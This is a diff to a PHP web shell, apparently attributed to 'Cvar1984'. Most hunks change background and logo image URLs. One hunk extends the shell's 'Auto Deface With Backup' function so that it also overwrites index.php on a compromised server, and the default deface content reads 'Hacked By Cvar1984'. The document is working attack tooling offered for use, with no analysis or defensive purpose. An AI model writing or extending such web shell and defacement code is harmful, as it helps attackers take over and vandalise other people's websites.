@@ -110,7 +110,7 @@ if (!isset($_SESSION[md5(sha1($_SERVER['HTTP_HOST'])) ])) {
 		background: black;
 		color: lavender;
 		text-shadow: 2px 2px 4px #000000;
-		background: url(http://shing.mobile9.com/download/media/538/tuzkiyouse_wk2o9pqf.jpg) no-repeat center center fixed;
+		background: url(https://cvar1984.github.io/bg.jpg) no-repeat center center fixed;
 		-webkit-background-size: cover;
 		-moz-background-size: cover;
 		-o-background-size: cover;
@@ -156,7 +156,11 @@ if (!isset($_SESSION[md5(sha1($_SERVER['HTTP_HOST'])) ])) {
 	}
 
 	#textarea {
-		background: transparent;
+		background: url(https://cvar1984.github.io/textarea-bg.jpg) no-repeat center center fixed;
+		-webkit-background-size: cover;
+		-moz-background-size: cover;
+		-o-background-size: cover;
+		background-size: cover;
 		width: 1066px;
 		height: 500px;
 		font-family: Arial, Helvetica, monospace;
@@ -826,6 +830,11 @@ function ngindex() {
 				alert("index.html Defaced");
 			}
 		}
+		else {
+			if (file_put_contents('index.php', $file)) {
+				alert("index.php Defaced");
+			}
+		}
 	}
 ?>
 <center><h2>Auto Deface With Backup</h2></center>
@@ -845,7 +854,7 @@ function ngindex() {
 			</tr>
 		<tr>
 			<td>Image Link</td> <td>:</td> 
-			<td><input type='text' class='input-sm' id='input' value='https://minervagunceleri.files.wordpress.com/2014/08/logo.png' name='images'></td>
+			<td><input type='text' class='input-sm' id='input' value='https://cvar1984.github.io/logo.png' name='images'></td>
 		<tr>
 			<td>Content</td> <td>:</td>
 			<td><input type='text' class='input-sm' id='input' value='Hacked By Cvar1984' name='content'></td>
